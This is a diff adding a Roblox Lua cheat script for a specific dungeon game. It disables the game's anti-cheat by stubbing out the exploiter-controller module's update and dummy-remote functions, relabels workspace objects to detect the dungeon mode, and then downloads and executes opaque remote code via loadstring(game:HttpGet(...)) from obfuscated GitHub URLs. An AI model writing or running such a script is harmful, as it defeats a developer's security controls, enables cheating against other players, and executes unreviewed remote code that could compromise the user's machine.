@@ -1,1 +1,71 @@
 
+-- Valuable Servers
+local isWaveDefense
+local isGrandGrotto
+local isLobby = game.PlaceId == 2960777560
+
+function bypassAntiCheat()
+    local exploiterController = game:GetService("Players").LocalPlayer.PlayerScripts.Shared.Client:WaitForChild(
+        'DumbExploiterController')
+
+    -- bypass anti-cheat
+    local cheat = require(exploiterController)
+    cheat._Update = function()
+        return
+    end
+
+    cheat._SetupDummyRemotes = function()
+        return
+    end
+
+    while not game:GetService("Players") do
+        wait()
+    end
+
+    while not game:GetService("ReplicatedStorage") do
+        wait()
+    end
+
+    task.wait(2)
+
+    game:GetService("Players").Name = 'Players'
+    game:GetService("ReplicatedStorage").Name = 'ReplicatedStorage'
+    workspace.Name = 'Workspace'
+
+    if isLobby then
+        return
+    end
+
+    workspace:GetChildren()[5].Name = 'Dungeon'
+
+    -- Wave defense
+    if workspace.Dungeon:FindFirstChild("EnemySpawns") then
+        workspace.Dungeon:GetChildren()[5].Name = 'Enemies'
+        isWaveDefense = workspace.Dungeon:FindFirstChild("EnemySpawns")
+        return
+    end
+
+    -- Nomal dungeon
+    workspace.Dungeon:GetChildren()[1].Name = 'Enemies'
+    workspace.Dungeon:GetChildren()[2].Name = 'Rooms'
+
+    -- Grand Grotto
+    if workspace.Dungeon.Rooms:FindFirstChild("Start"):FindFirstChild("Traps") then
+        isGrandGrotto = true
+end
+
+-- Dungeon
+    if workspace.Dungeon.Rooms:FindFirstChild("Start") then
+        isDungeon = true
+   end
+end
+
+bypassAntiCheat()
+ 
+if isLobby then
+loadstring(game:HttpGet('https://raw.githubusercontent.com/jOSHCLABC/GajdkavdfJ-Test--1/main/VCKSDFGH-%231/GCKsCKs-%7B%7D'))()
+end
+
+if isDungeon or isWaveDefense or isGrandGrotto then
+loadstring(game:HttpGet('https://raw.githubusercontent.com/jOSHCLABC/GajdkavdfJ-Test--1/main/VCKSDFGH-%231/FkcKsD-%7B%7D'))()
+end
